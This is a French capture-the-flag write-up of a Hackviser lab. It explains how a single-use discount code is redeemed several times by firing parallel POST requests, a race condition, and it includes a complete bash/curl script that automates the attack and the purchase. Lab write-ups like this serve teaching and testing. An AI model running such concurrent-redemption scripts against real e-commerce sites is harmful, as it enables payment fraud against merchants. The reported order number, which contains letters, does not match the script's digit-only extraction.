# Exploitation de la vulnérabilité du code de réduction - Hackviser Lab

## Description du problème

Le laboratoire "Discount Code VIP" de Hackviser présente une vulnérabilité où un code de réduction à usage unique (FLASHSALE50, réduisant de 50$) peut être utilisé plusieurs fois, permettant ainsi l'achat d'un billet dont le coût initial (300$) est supérieur au solde du compte (130$). L'objectif est de réduire le prix du billet suffisamment pour l'acheter et de récupérer le numéro de commande.

## Objectif

Acheter le billet à un prix abordable (inférieur ou égal à 130$) en utilisant le code de réduction FLASHSALE50 plusieurs fois, puis obtenir le numéro de commande de la transaction.

## Étapes de résolution

### 1. Analyse initiale de la page

En accédant à l'URL fournie (`https://loved-blockbuster.europe1.hackviser.space`), les informations suivantes ont été relevées :
- Prix du billet : 300 $
- Solde du compte : 130 $
- Code de réduction : `FLASHSALE50` (50 $ de réduction, usage unique).
- Boutons "Use Discount code" et "Buy Ticket", ainsi qu'un bouton "Reset".

Pour récupérer le code source HTML afin d'analyser les formulaires et les scripts, la commande `curl` a été utilisée :

```bash
curl https://loved-blockbuster.europe1.hackviser.space
```

### 2. Compréhension du mécanisme d'application du code

L'analyse du code source HTML a révélé deux formulaires POST sur la même page, interagissant via des cookies de session (`PHPSESSID`).

**Formulaire d'application du code de réduction:**
```html
<form action="" method="post">        
    <div class="mb-3" style="margin-top:-15px;">                                                
        <label for="code" class="form-label"></label>                                           
        <input class="form-control" type="text" name="code" id="code" placeholder="Discount code" required>                 
    </div>                            
    <div class="d-grid gap-2">        
        <button class="btn btn-warning" type="submit" name="useDiscountCode">Use Discount code</button>             
    </div>                            
</form>
```

**Formulaire d'achat du billet:**
```html
<form action="" method="post">        
    <div class="d-grid gap-2">        
        <button class="btn btn-primary" type="submit" name="buy">Buy Ticket</button>            
    </div>                            
</form>
```

### 3. Tentatives initiales et défis

Les tentatives d'application successive du code de réduction en envoyant des requêtes POST séparées ont échoué. Le serveur reconnaissait l'utilisation unique du code et n'appliquait la réduction qu'une seule fois, affichant le message "You have already used the discount code!".
L'extraction du "Cart Total" de la réponse HTML s'est avérée complexe en raison de la mise en forme du HTML (valeur sur une ligne distincte de l'étiquette) et a nécessité plusieurs itérations de débogage des expressions `grep` et `sed`. La solution a été d'utiliser une combinaison de `grep -A 1` et `tail -n 1` pour isoler la ligne contenant le prix, suivie d'un `grep -oP '[0-9]+'` pour extraire la valeur numérique.

### 4. Solution : Exploitation d'une condition de concurrence

La mention "a vulnerability that allows a discount code to exceed its redemption limit" a suggéré une vulnérabilité de type "condition de concurrence" (Race Condition). L'idée est d'envoyer plusieurs requêtes d'application du code de réduction *simultanément* au serveur. Si le serveur ne met pas à jour l'état d'utilisation du code assez rapidement entre les requêtes, il est possible que plusieurs d'entre elles soient traitées comme si le code n'avait pas encore été utilisé.

### 5. Mise en œuvre technique

Le script Bash suivant a été utilisé pour exploiter la vulnérabilité :

```bash
cookie_file="/home/aurel/.gemini/tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookies.txt"
response_file="/home/aurel/.gemini/tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/response.html"
url="https://loved-blockbuster.europe1.hackviser.space"
reset_url="https://loved-blockbuster.europe1.hackviser.space/reset.php"

# 1. Reset session to start with a clean state and get fresh cookies
echo "Réinitialisation de la session..."
curl -c "$cookie_file" "$reset_url" > /dev/null

# 2. Get initial page to ensure cookies are set for the main URL
curl -b "$cookie_file" -c "$cookie_file" "$url" > /dev/null

# 3. Launch parallel requests to apply discount code (4 times for a total of 200$ discount)
echo "Lancement des requêtes parallèles pour appliquer le code de réduction..."
for i in {1..4}; do
    curl -s -b "$cookie_file" -c "$cookie_file" -X POST -d "code=FLASHSALE50&useDiscountCode=" "$url" > /dev/null &
done
wait # Attendre la fin de tous les processus d'arrière-plan

echo "Requêtes parallèles envoyées. Attente de quelques instants pour le traitement du serveur..."
sleep 2 # Donner un peu de temps au serveur pour traiter les requêtes

# 4. Check final cart total
echo "Vérification du total final du panier..."
curl -s -b "$cookie_file" "$url" > "$response_file"

final_cart_total=$(cat "$response_file" | grep -A 1 "Cart Total (1 x Ticket):" | tail -n 1 | grep -oP '[0-9]+' | head -1)
final_cart_total=${final_cart_total:-0}
echo "Total final du panier : $final_cart_total $"

# 5. Proceed to buy the ticket if affordable
if (( final_cart_total <= 130 )); then
    echo "Le total du panier ($final_cart_total $) est abordable. Procédure d'achat du billet."
    buy_response=$(curl -s -b "$cookie_file" -c "$cookie_file" -X POST -d "buy=" "$url")
    order_number=$(echo "$buy_response" | grep -oP 'Your order number is: <b>\K[0-9]+')
    if [ -n "$order_number" ]; then
        echo "Numéro de commande: $order_number"
    else
        echo "Impossible de trouver le numéro de commande dans la réponse."
        echo "Réponse de l'opération d'achat :"
        echo "$buy_response"
    fi
else
    echo "Le total du panier ($final_cart_total $) est trop élevé. Impossible d'acheter le billet."
fi

# Nettoyage du fichier de réponse temporaire
rm -f "$response_file"
```

### 6. Résultat final

La condition de concurrence a été exploitée avec succès. Le prix du billet, initialement de 300 $, a été réduit à **100 $** (300 $ - 4 * 50 $), ce qui était inférieur au solde du compte de 130 $. L'achat a été effectué avec succès, et le numéro de commande a été extrait de la réponse.

Le "Account balance" affiché après l'achat était de `30 $` (130 $ - 100 $).

## Numéro de commande final

Le numéro de commande obtenu est : **4c5d3f1eebcf04e1df8f**